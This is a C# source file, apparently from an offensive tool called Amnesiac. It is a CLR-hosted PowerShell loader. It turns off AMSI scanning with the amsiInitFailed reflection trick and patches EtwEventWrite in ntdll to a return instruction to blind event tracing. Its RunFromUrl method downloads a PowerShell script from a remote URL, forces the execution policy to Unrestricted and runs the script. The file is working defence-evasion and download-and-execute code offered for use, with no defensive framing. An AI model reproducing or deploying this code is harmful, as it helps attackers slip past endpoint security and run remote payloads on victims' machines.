// AmnesiacBridge -- C# Runspace host loaded by amnesiac_launcher.exe via CLR.
// Applies managed AMSI+ETW bypasses (safe in-process with CLR), then runs
// Amnesiac_ShellReady.ps1 interactively via a full PSHost Runspace.
// Target: net462 (runs on any Windows with .NET 4.6.2+)

using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Globalization;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace AmnesiacBridge
{
    // ---------------------------------------------------------------------------
    // Raw UI -- all properties safe for non-console / background-thread access
    // ---------------------------------------------------------------------------
    sealed class ConsoleRawUI : PSHostRawUserInterface
    {
        static readonly Size _safe = new Size(120, 50);

        public override ConsoleColor BackgroundColor
        {
            get { try { return Console.BackgroundColor; } catch { return ConsoleColor.Black; } }
            set { try { Console.BackgroundColor = value; } catch { } }
        }
        public override ConsoleColor ForegroundColor
        {
            get { try { return Console.ForegroundColor; } catch { return ConsoleColor.Gray; } }
            set { try { Console.ForegroundColor = value; } catch { } }
        }
        public override Size BufferSize
        {
            get { try { return new Size(Console.BufferWidth, Console.BufferHeight); } catch { return _safe; } }
            set { try { Console.BufferWidth = value.Width; Console.BufferHeight = value.Height; } catch { } }
        }
        public override Size WindowSize
        {
            get { try { return new Size(Console.WindowWidth, Console.WindowHeight); } catch { return _safe; } }
            set { try { Console.WindowWidth = value.Width; Console.WindowHeight = value.Height; } catch { } }
        }
        public override Size MaxWindowSize
        {
            get { try { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); } catch { return _safe; } }
        }
        public override Size MaxPhysicalWindowSize => MaxWindowSize;
        public override Coordinates WindowPosition
        {
            get { try { return new Coordinates(Console.WindowLeft, Console.WindowTop); } catch { return new Coordinates(0, 0); } }
            set { try { Console.SetWindowPosition(value.X, value.Y); } catch { } }
        }
        public override string WindowTitle
        {
            get { try { return Console.Title; } catch { return "Amnesiac"; } }
            set { try { Console.Title = value; } catch { } }
        }
        public override Coordinates CursorPosition
        {
            get { try { return new Coordinates(Console.CursorLeft, Console.CursorTop); } catch { return new Coordinates(0, 0); } }
            set { try { Console.SetCursorPosition(value.X, value.Y); } catch { } }
        }
        public override int CursorSize
        {
            get { try { return Console.CursorSize; } catch { return 25; } }
            set { try { Console.CursorSize = value; } catch { } }
        }
        public override bool KeyAvailable
        {
            get { try { return Console.KeyAvailable; } catch { return false; } }
        }

        public override void FlushInputBuffer() { }

        public override KeyInfo ReadKey(ReadKeyOptions options)
        {
            bool intercept = (options & ReadKeyOptions.NoEcho) != 0;
            ConsoleKeyInfo k = Console.ReadKey(intercept);
            ControlKeyStates ctrl = 0;
            if ((k.Modifiers & ConsoleModifiers.Alt)     != 0) ctrl |= ControlKeyStates.LeftAltPressed;
            if ((k.Modifiers & ConsoleModifiers.Control) != 0) ctrl |= ControlKeyStates.LeftCtrlPressed;
            if ((k.Modifiers & ConsoleModifiers.Shift)   != 0) ctrl |= ControlKeyStates.ShiftPressed;
            return new KeyInfo((int)k.Key, k.KeyChar, ctrl, false);
        }

        public override BufferCell[,] GetBufferContents(Rectangle r) => new BufferCell[0, 0];
        public override void SetBufferContents(Coordinates origin, BufferCell[,] contents) { }
        public override void SetBufferContents(Rectangle r, BufferCell fill) { }
        public override void ScrollBufferContents(Rectangle src, Coordinates dst, Rectangle clip, BufferCell fill) { }
    }

    // ---------------------------------------------------------------------------
    // User interface -- delegates I/O to System.Console
    // ---------------------------------------------------------------------------
    sealed class ConsoleUI : PSHostUserInterface
    {
        private readonly ConsoleRawUI _raw = new ConsoleRawUI();
        public override PSHostRawUserInterface RawUI => _raw;

        public override string ReadLine() => Console.ReadLine() ?? string.Empty;

        public override SecureString ReadLineAsSecureString()
        {
            var ss = new SecureString();
            ConsoleKeyInfo k;
            while ((k = Console.ReadKey(true)).Key != ConsoleKey.Enter)
            {
                if (k.Key == ConsoleKey.Backspace) { if (ss.Length > 0) ss.RemoveAt(ss.Length - 1); }
                else ss.AppendChar(k.KeyChar);
            }
            Console.WriteLine();
            ss.MakeReadOnly();
            return ss;
        }

        public override void Write(string value) => Console.Write(value);

        public override void Write(ConsoleColor fg, ConsoleColor bg, string value)
        {
            var prevFg = Console.ForegroundColor;
            var prevBg = Console.BackgroundColor;
            try { Console.ForegroundColor = fg; Console.BackgroundColor = bg; } catch { }
            Console.Write(value);
            try { Console.ForegroundColor = prevFg; Console.BackgroundColor = prevBg; } catch { }
        }

        public override void WriteLine()                => Console.WriteLine();
        public override void WriteLine(string value)    => Console.WriteLine(value);
        public override void WriteDebugLine(string msg) => Console.WriteLine("[DEBUG] " + msg);
        public override void WriteVerboseLine(string msg) { }
        public override void WriteWarningLine(string msg)
        {
            var prev = Console.ForegroundColor;
            try { Console.ForegroundColor = ConsoleColor.Yellow; } catch { }
            Console.WriteLine("[WARNING] " + msg);
            try { Console.ForegroundColor = prev; } catch { }
        }
        public override void WriteErrorLine(string value)
        {
            var prev = Console.ForegroundColor;
            try { Console.ForegroundColor = ConsoleColor.Red; } catch { }
            Console.Error.WriteLine(value);
            try { Console.ForegroundColor = prev; } catch { }
        }
        public override void WriteProgress(long sourceId, ProgressRecord record) { }

        public override Dictionary<string, PSObject> Prompt(
            string caption, string message, Collection<FieldDescription> descriptions)
        {
            Console.WriteLine(caption);
            Console.WriteLine(message);
            var result = new Dictionary<string, PSObject>();
            foreach (var d in descriptions)
            {
                Console.Write(d.Name + ": ");
                result[d.Name] = new PSObject(Console.ReadLine());
            }
            return result;
        }

        public override PSCredential PromptForCredential(
            string caption, string message, string userName, string targetName)
        {
            Console.WriteLine(caption + " -- " + message);
            Console.Write("Username [" + userName + "]: ");
            string u = Console.ReadLine();
            if (string.IsNullOrEmpty(u)) u = userName;
            Console.Write("Password: ");
            return new PSCredential(u, ReadLineAsSecureString());
        }

        public override PSCredential PromptForCredential(
            string caption, string message, string userName, string targetName,
            PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
            => PromptForCredential(caption, message, userName, targetName);

        public override int PromptForChoice(
            string caption, string message, Collection<ChoiceDescription> choices, int defaultChoice)
        {
            Console.WriteLine(caption);
            Console.WriteLine(message);
            for (int i = 0; i < choices.Count; i++)
                Console.WriteLine("  [{0}] {1}", i, choices[i].Label);
            Console.Write("Choice [" + defaultChoice + "]: ");
            string line = Console.ReadLine();
            return int.TryParse(line, out int n) ? n : defaultChoice;
        }
    }

    // ---------------------------------------------------------------------------
    // Host
    // ---------------------------------------------------------------------------
    sealed class ConsoleHost : PSHost
    {
        private readonly Guid      _id  = Guid.NewGuid();
        private readonly ConsoleUI _ui  = new ConsoleUI();

        public override string              Name             => "AmnesiacLauncher";
        public override Version             Version          => new Version(1, 0);
        public override Guid                InstanceId       => _id;
        public override PSHostUserInterface UI               => _ui;
        public override CultureInfo         CurrentCulture   => CultureInfo.CurrentCulture;
        public override CultureInfo         CurrentUICulture => CultureInfo.CurrentUICulture;
        public override void EnterNestedPrompt()    { }
        public override void ExitNestedPrompt()     { }
        public override void NotifyBeginApplication() { }
        public override void NotifyEndApplication()   { }
        public override void SetShouldExit(int exitCode) => Environment.Exit(exitCode);
    }

    // ---------------------------------------------------------------------------
    // Public entry point -- called from C++ via CLR hosting
    // ---------------------------------------------------------------------------
    public static class Launcher
    {
        // -----------------------------------------------------------------------
        // P/Invoke for managed ETW byte-patch
        // -----------------------------------------------------------------------
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string proc);
        [DllImport("kernel32.dll")] static extern bool   VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);

        // amsiInitFailed -- sets PS internal flag so AMSI is never initialised.
        // This is the patchless AMSI bypass: no bytes written, no hooks installed.
        static void DisableAmsi()
        {
            try
            {
                var utils = typeof(PowerShell).Assembly
                    .GetType("System.Management.Automation.AmsiUtils");
                var field = utils?.GetField("amsiInitFailed",
                    BindingFlags.NonPublic | BindingFlags.Static);
                field?.SetValue(null, true);
            }
            catch { }
        }

        static void PatchEtw()
        {
            try
            {
                var h    = GetModuleHandle("ntdll.dll");
                var addr = GetProcAddress(h, "EtwEventWrite");
                if (addr == IntPtr.Zero) return;
                uint old;
                VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
                Marshal.WriteByte(addr, 0xC3);
                VirtualProtect(addr, (UIntPtr)1, old, out old);
            }
            catch { }
        }

        // -----------------------------------------------------------------------
        // Entry point called by ExecuteInDefaultAppDomain from native launcher.
        // -----------------------------------------------------------------------
        public static int RunFromUrl(string baseUrl)
        {
            string url = baseUrl.TrimEnd('/') + "/Amnesiac_ShellReady.ps1";
            string scriptContent;
            try
            {
                var wc = new System.Net.WebClient();
                wc.Encoding = System.Text.Encoding.UTF8;
                scriptContent = wc.DownloadString(url);
            }
            catch (Exception ex) { Console.Error.WriteLine("[-] Script download: " + ex.Message); return 1; }
            Run(scriptContent);
            return 0;
        }

        // scriptContent: UTF-8 content of Amnesiac_ShellReady.ps1
        public static void Run(string scriptContent)
        {
            try
            {
                // Apply managed bypasses BEFORE Runspace opens.
                // The native PAGE_GUARD VEH bypass was removed by launcher.cpp because
                // VEH context manipulation is incompatible with the CLR's managed-to-unmanaged
                // transition frame -- it causes an uncatchable AccessViolationException inside
                // rs.Open() when AMSI initialization hits the guarded page.
                DisableAmsi();  // amsiInitFailed=true  (patchless -- no bytes written)
                PatchEtw();     // EtwEventWrite -> ret  (one-byte patch in managed code)

                var host = new ConsoleHost();
                var iss  = InitialSessionState.CreateDefault();

                using (Runspace rs = RunspaceFactory.CreateRunspace(host, iss))
                {
                    rs.Open();

                    using (PowerShell bypass = PowerShell.Create())
                    {
                        bypass.Runspace = rs;
                        bypass.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force");
                        bypass.Invoke();
                    }

                    using (PowerShell ps = PowerShell.Create())
                    {
                        ps.Runspace = rs;

                        ps.AddScript(scriptContent);
                        ps.Invoke();

                        if (ps.HadErrors)
                        {
                            foreach (var e in ps.Streams.Error)
                                Console.Error.WriteLine("[-] Script error: " + e);
                            return;
                        }

                        ps.Commands.Clear();
                        ps.AddCommand("Amnesiac");

                        var output = new PSDataCollection<PSObject>();
                        output.DataAdded += (s, e) =>
                        {
                            var col = s as PSDataCollection<PSObject>;
                            if (col == null) return;
                            foreach (var item in col.ReadAll())
                                if (item != null) Console.WriteLine(item.ToString());
                        };
                        ps.Streams.Error.DataAdded += (s, e) =>
                        {
                            var col = s as PSDataCollection<ErrorRecord>;
                            if (col == null) return;
                            foreach (var err in col.ReadAll())
                                Console.Error.WriteLine("[-] " + err);
                        };

                        var async = ps.BeginInvoke<PSObject, PSObject>(null, output);
                        ps.EndInvoke(async);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[-] " + ex.GetType().Name + ": " + ex.Message);
            }
        }
    }
}
